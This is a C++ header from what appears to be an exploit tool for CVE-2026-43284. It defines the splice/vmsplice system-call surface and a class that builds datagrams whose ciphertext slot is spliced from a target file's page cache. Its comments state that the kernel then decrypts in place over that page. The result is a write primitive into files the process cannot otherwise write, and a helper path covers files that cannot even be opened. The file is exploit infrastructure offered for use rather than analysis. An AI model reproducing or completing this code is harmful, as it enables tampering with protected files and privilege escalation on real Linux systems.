#pragma once
/** @file backend/cve_2026_43284/seam/real_splice_io.hpp
 *  The system side of the write as real calls, behind one replaceable surface.
 *
 *  The old tree kept the same seam, and this file keeps its shape: every call involved
 *  (pipe2/splice/vmsplice/sendmsg/pread/close) sits behind one replaceable interface, the device
 *  binding is real_splice_io(), and host tests bind a fake -- so the write body has no direct call
 *  dependency. On top of the surface, RealSpliceIo is the concrete SpliceOps the device uses: the
 *  two block sources, the pipe assembly, and the retry rules the old implementation measured.
 *
 *  The frame the concrete class sends is the whole datagram the write body assembled. The sixteen
 *  bytes of the ciphertext slot travel on the wire spliced from the target file at the write
 *  offset, not from the buffer -- that substitution is the primitive, because the kernel then
 *  decrypts in place over that page. So the page source is required: with no usable descriptor and
 *  no bound bridge there is no datagram, and a bridge that returns anything but a full block fails
 *  the block closed.
 *
 *  No path allocates: caller buffers and one descriptor pair are all it uses.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/seam/pagecache_write.hpp"

namespace ghostlock::backend::cve_2026_43284::seam {
    /** Injected source for the sixteen bytes the vector is derived from. Unbound keeps the direct
     *  read through the surface; a carrier this process cannot read directly binds the bridge here,
     *  and the bridge is all-or-nothing: only a full block counts, and any other outcome fails the
     *  block closed rather than feed a wrong vector into a datagram. */
    struct OldPageSource final {
        void *ctx = nullptr;
        long (*read16)(void *ctx, std::uint64_t offset,
                       std::uint8_t out[kBlockBytes]) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept { return read16 != nullptr; }
    };

    /** Injected source for the ciphertext page when the target file cannot be opened at all. The
     *  real binding runs the helper with its output on the write pipe; the helper splices the page
     *  into that pipe itself. Only a full block counts; anything else fails the block closed. */
    struct HelperWriteSource final {
        void *ctx = nullptr;
        long (*splice16)(void *ctx, int pipe_write_fd,
                         std::uint64_t offset) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept { return splice16 != nullptr; }
    };

    /** The calls the write needs, as one replaceable surface. A surface is usable only when every
     *  entry point is bound; there is no separate ready flag, so a half-bound surface cannot
     *  advertise itself. */
    struct SpliceIoOps final {
        /** Create a pipe. Returns 0, or -errno. */
        int (*pipe2)(int fds[2], int flags) noexcept = nullptr;
        /** Move up to len bytes between descriptors; the offsets are inputs (null for a pipe end).
         *  Returns the moved count, or -errno. */
        long (*splice)(int fd_in, const std::uint64_t *off_in, int fd_out,
                       const std::uint64_t *off_out, std::size_t len,
                       unsigned flags) noexcept = nullptr;
        /** Map len bytes of caller memory into the pipe. Returns the mapped count, or -errno. */
        long (*vmsplice)(int fd, const std::uint8_t *data, std::size_t len,
                         unsigned flags) noexcept = nullptr;
        /** Send exactly one datagram on a connected socket. Returns len, or -errno. The splice path
         *  does not use this entry, but it stays part of the surface for the same reason as before:
         *  an incomplete surface must not read as usable. */
        long (*send_datagram)(int fd, const std::uint8_t *buf, std::size_t len) noexcept = nullptr;
        /** Read up to len bytes at an offset. Returns the count, 0 at end of file, or -errno. */
        long (*read_at)(int fd, std::uint8_t *out, std::size_t len,
                        std::uint64_t offset) noexcept = nullptr;
        /** close(2). Returns 0, or -errno. */
        int (*close_fd)(int fd) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept {
            return pipe2 != nullptr && splice != nullptr && vmsplice != nullptr &&
                   send_datagram != nullptr && read_at != nullptr && close_fd != nullptr;
        }
    };

    /** Device binding: the real calls on Linux; an all-null surface anywhere else, so the tree
     *  still links and available() stays false instead of a link error. */
    [[nodiscard]] SpliceIoOps real_splice_io() noexcept;

    /** The concrete system side: the surface plus the two block sources. */
    class RealSpliceIo final : public SpliceOps {
    public:
        RealSpliceIo(SpliceIoOps io, int file_fd, int pipe_flags = 0,
                     OldPageSource old_page = {}, HelperWriteSource helper = {}) noexcept
            : io_(io), file_fd_(file_fd), pipe_flags_(pipe_flags),
              old_page_(old_page), helper_(helper) {}

        RealSpliceIo(const RealSpliceIo &) = delete;
        RealSpliceIo &operator=(const RealSpliceIo &) = delete;
        ~RealSpliceIo() noexcept override = default;

        /** The block at an offset: the direct read through the surface, retried on short transfers
         *  and on -EINTR, then the bound source when the direct read could not finish.
         *  @return exactly @p size on success; a short count, or a negative -errno, otherwise. */
        [[nodiscard]] long read_at(int fd, std::uint8_t *out, std::size_t size,
                                   std::uint64_t offset) noexcept override;

        /** Send one datagram of @p size bytes: the in-memory bytes before the ciphertext slot, the
         *  page spliced from the target at @p offset, then the in-memory remainder (the check).
         *  @return false when @p datagram is null, when the frame is too short to hold the page,
         *          when no page source can run, or when any step fails; then no datagram is sent. */
        [[nodiscard]] bool splice_one(int socket_fd, const std::uint8_t *datagram,
                                      std::size_t size, std::uint64_t offset) noexcept override;

        /** The vector, from the primitive that owns it. */
        void compute_iv(const std::uint8_t old_block[kBlockBytes],
                        const std::uint8_t key[32],
                        std::uint8_t out[kBlockBytes]) noexcept override;

        /** The check, from the primitive that owns it. */
        void compute_icv(const std::uint8_t *datagram, std::size_t size,
                         const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                         std::uint8_t *out) noexcept override;

    private:
        SpliceIoOps io_;
        int file_fd_ = -1;
        int pipe_flags_ = 0;
        OldPageSource old_page_{};
        HelperWriteSource helper_{};
    };
}  // namespace ghostlock::backend::cve_2026_43284::seam
